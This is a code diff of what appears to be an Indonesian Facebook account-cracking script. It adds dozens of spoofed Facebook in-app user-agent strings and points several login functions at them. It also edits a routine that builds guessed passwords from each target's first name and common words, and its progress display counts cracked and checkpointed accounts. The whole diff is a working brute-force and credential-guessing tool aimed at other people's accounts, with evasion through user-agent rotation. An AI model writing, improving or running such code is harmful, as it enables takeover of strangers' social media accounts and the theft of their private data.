@@ -65,6 +65,7 @@ uidl =[]
 opsi=[]
 uidf=[]
 liu=[]
+ugenki=[]
 licenseKey=[]
 console = Console()
 ses=requests.Session()
@@ -113,13 +114,48 @@ for xd in range(10000):
 for brayen in range(10000):
     rr = random.randint
     rc = random.choice
-    merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280'])
-    build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
     u1 = f"Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 7 Pro Build/QKQ1.190915.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36 PHX/13.1"
     u2 = f"Mozilla/5.0 (Linux; Android 10; Redmi Y3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322"
     u3 = f"Mozilla/5.0 (Linux; Android 6.0; Redmi Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
+    ua4 = f"Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; 22011119UY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; Lenovo TB-J607Z Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/347.0.0.17.97;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; CPH2307 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; SM-A315G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 8.1.0; CLT-L29 Build/HUAWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 13; SM-X800 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWBS32.125-29-2-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/347.0.0.17.97;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 9; BV9800Pro Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; M2101K7BNY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 8.0.0; SM-A600FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; LM-X430 Build/QKQ1.200730.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; KB2003 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 13; M2101K6G Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; SM-A013M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 9; Mi A2 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro Build/TQ2A.230305.008.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 9; moto e6s Build/POBS29.288-46-6-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606X Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;] [ip:46.190.9.221]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; MAR-LX1B Build/HUAWEIMAR-L21B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro Build/TQ1A.230205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; LYA-L09 Build/HUAWEILYA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; moto e20 Build/RON31.267-38; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 10; SM-J810M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]"
+    ua4 = f"Mozilla/5.0 (Linux; Android 11; T775H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
     UaMainn = random.choice([u1, u2, u3])
-    ugen.append(UaMainn)
+    ugenki.append(UaMainn)
 
 for memekx in range(200):
 	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
@@ -708,7 +744,7 @@ def passwrd():
 			for yuzong in id2:
 				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 				frs = nmf.split(" ")[0]
-				pwv = ['anjing123','koplo123','sayang','sayangku','sayang123','bismillah','katasandi','sandi123','malang','bismillah123','koplak123']
+				pwv = ['kontol123','anjing123','koplo123','sayang','sayangku','sayang123','bismillah','katasandi','sandi123','malang','bismillah123','koplak123']
 				if len(nmf)<6:
 					if len(frs)<3:
 						pass
@@ -718,15 +754,6 @@ def passwrd():
 						pwv.append(frs+'2')
 						pwv.append(frs+'3')
 						pwv.append(frs+'00')
-						pwv.append(frs+'01')
-						pwv.append(frs+'02')
-						pwv.append(frs+'03')
-						pwv.append(frs+'04')
-						pwv.append(frs+'05')
-						pwv.append(frs+'06')
-						pwv.append(frs+'07')
-						pwv.append(frs+'08')
-						pwv.append(frs+'09')
 						pwv.append(frs+'4321')
 						pwv.append(frs+'54321')
 						pwv.append(frs+'654321')
@@ -738,6 +765,7 @@ def passwrd():
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
+						pwv.append(frs+'12')
 						pwv.append(frs+'12')
 						pwv.append(frs+'321')
 						pwv.append(frs+'123')
@@ -770,7 +798,7 @@ def passwrd():
 def validate1(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(ugen)
+	ua = random.choice(ugenki)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	prog.update(des,description=f"[bold green]M {bo}CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
@@ -839,7 +867,7 @@ def validate1(idf,pwv):
 def validate2(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(ugen)
+	ua = random.choice(ugenki)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	prog.update(des,description=f"[bold green]Mbasic {bo}CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
@@ -909,7 +937,7 @@ def validate2(idf,pwv):
 def reguler1(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(ugen)
+	ua = random.choice(ugenki)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	prog.update(des,description=f"[bold green]Reguler {bo}CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
@@ -997,7 +1025,7 @@ def api1(idf,pwv):
     kuki =[]
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    ua = random.choice(liu)
+    ua = random.choice(ugenki)
     ua2 = random.choice(ugen2)
     ses = requests.Session()
     pers = loop*100/len(id2)
